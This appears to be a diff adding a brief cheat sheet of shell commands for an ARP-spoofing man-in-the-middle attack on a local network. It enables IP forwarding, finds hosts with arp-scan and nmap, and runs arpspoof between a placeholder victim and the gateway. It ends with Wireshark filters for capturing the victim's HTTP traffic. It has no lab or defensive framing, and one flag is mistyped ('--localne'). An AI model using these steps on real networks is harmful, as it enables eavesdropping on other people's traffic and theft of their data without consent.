@@ -1,0 +1,20 @@
+All the comminds you need.
+
+ip a
+
+sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
+
+sudo arp-scan --interface=eth0/wlan0 --localne
+
+nmap -sn -O <subnet/24>
+
+sudo sysctl -w net.ipv4.ip_forward=1
+
+sudo arpspoof -i eth0/wlan0 -t <victim ip> <gateway ip>
+
+sudo arpspoof -i eth0/wlan0 -t <gateway ip> <victim ip>
+
+Wireshark ip.addr == <victim ip>
+tcp.port == 8080
+tcp.port == 80
+http
